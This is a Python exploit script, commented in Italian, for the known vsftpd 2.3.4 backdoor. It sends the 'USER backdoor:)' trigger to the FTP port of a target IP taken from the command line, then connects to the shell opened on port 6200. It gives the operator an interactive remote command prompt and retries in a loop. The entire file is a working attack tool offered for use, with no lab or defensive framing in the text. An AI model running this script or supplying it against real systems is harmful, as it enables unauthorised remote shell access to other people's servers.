import argparse
import itertools
import socket
import sys
import threading
import time


# Funzione per l'animazione di caricamento
def animate(message):
    for c in itertools.cycle(["|", "/", "-", "\\"]):
        if done:
            break
        sys.stdout.write("\r" + message + " " + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write("\r" + message + " ... Done!\n")


# Funzione per inviare payload e ricevere risposta dal server
def send_payload(sock, payload):
    sock.send(payload.encode())  # Invia il payload al server
    response = sock.recv(1024)  # Riceve la risposta del server
    print(f"Risposta dal server: {response.decode().strip()}")
    return response


# Funzione per connettersi alla backdoor sulla porta 6200
def connect_backdoor(target_ip, backdoor_port=6200):
    global done
    for attempt in range(5):  # Tentativi di connessione alla backdoor
        try:
            shell_sock = socket.socket(
                socket.AF_INET, socket.SOCK_STREAM
            )  # Creazione del socket
            shell_sock.connect(
                (target_ip, backdoor_port)
            )  # Connessione alla porta della backdoor
            print(f"Connesso alla shell backdoor su {target_ip}:{backdoor_port}")
            return shell_sock
        except socket.error as e:
            print(
                f"Tentativo {attempt + 1}: Connessione alla shell backdoor fallita. Ritentando..."
            )
            time.sleep(2)  # Attende 2 secondi prima di ritentare
    done = True
    return None


# Funzione per ricevere dati dalla shell con un timeout
def recv_data(sock, timeout=2):
    sock.setblocking(0)
    total_data = []
    data = ""
    begin = time.time()
    while True:
        # Se abbiamo ricevuto dati, resettiamo il timer di timeout
        if total_data and time.time() - begin > timeout:
            break
        # Se non abbiamo ricevuto dati, impostiamo un limite di timeout
        elif time.time() - begin > timeout * 2:
            break
        try:
            data = sock.recv(4096)
            if data:
                total_data.append(data.decode())
                begin = time.time()
            else:
                time.sleep(0.1)
        except:
            pass
    return "".join(total_data)


# Funzione principale per eseguire l'exploit vsftpd
def exploit_vsftpd(target_ip, target_port=21, backdoor_port=6200):
    global done
    while True:
        try:
            # Creazione del socket per FTP
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))  # Connessione al server FTP
            print(f"Connesso a {target_ip} sulla porta {target_port}")

            # Ricezione del banner FTP
            banner = sock.recv(1024)  # Riceve il banner di benvenuto del server FTP
            print(f"Banner ricevuto: {banner.decode().strip()}")

            # Invio del payload per triggerare la backdoor
            payload = "USER backdoor:)\r\n"
            response = send_payload(
                sock, payload
            )  # Invia il comando USER con il payload per triggerare la backdoor

            if not response.startswith(b"331"):
                print("Il server non ha risposto come previsto.")
                sock.close()
                continue

            payload = "PASS anything\r\n"
            send_payload(
                sock, payload
            )  # Invia il comando PASS per completare l'autenticazione

            # Attendere per assicurarsi che la backdoor sia attiva
            print("Attendere 5 secondi per l'attivazione della backdoor...")
            done = False
            t = threading.Thread(
                target=animate, args=("Attendere",)
            )  # Avvia l'animazione di attesa
            t.start()
            time.sleep(5)
            done = True
            t.join()

            # Connessione alla shell sulla porta 6200
            shell_sock = connect_backdoor(target_ip, backdoor_port)
            if shell_sock:
                try:
                    while True:
                        command = input("Shell> ")  # Attende l'input dell'utente
                        if command.lower() in ["exit", "quit"]:
                            break
                        if command.strip():  # Controlla se il comando non è vuoto
                            shell_sock.send(
                                (command + "\n").encode()
                            )  # Invia il comando alla shell
                            time.sleep(1)

                            # Riceve la risposta dalla shell con un timeout
                            data = recv_data(shell_sock)
                            if not data:
                                print(
                                    "La shell non ha risposto. Tentativo di riconnessione..."
                                )
                                break
                            print(data, end="")

                            # Forza un prompt della shell
                            shell_sock.send(b"echo Shell pronta\n")
                            data = recv_data(shell_sock)
                            print(data, end="")

                    shell_sock.close()  # Chiude la connessione alla shell
                except socket.error as e:
                    print(f"Errore durante la connessione alla shell backdoor: {e}")
            else:
                print("Impossibile connettersi alla backdoor. Ritentando...")

            sock.close()  # Chiude la connessione FTP
            print("Disconnesso. Tentativo di riconnessione tra 5 secondi...")
            done = False
            t = threading.Thread(
                target=animate, args=("Riconnessione in corso",)
            )  # Avvia l'animazione di riconnessione
            t.start()
            time.sleep(5)  # Attendi 5 secondi prima di tentare la riconnessione
            done = True
            t.join()

        except Exception as e:
            print(f"Errore: {e}")
            break


if __name__ == "__main__":
    # Utilizzo di argparse per ottenere l'indirizzo IP del target dalla riga di comando
    parser = argparse.ArgumentParser(
        description="Esegue un exploit sulla vulnerabilità vsftpd 2.3.4"
    )
    parser.add_argument("target_ip", help="Indirizzo IP della macchina target")
    args = parser.parse_args()

    done = False
    target_ip = args.target_ip
    exploit_vsftpd(target_ip)
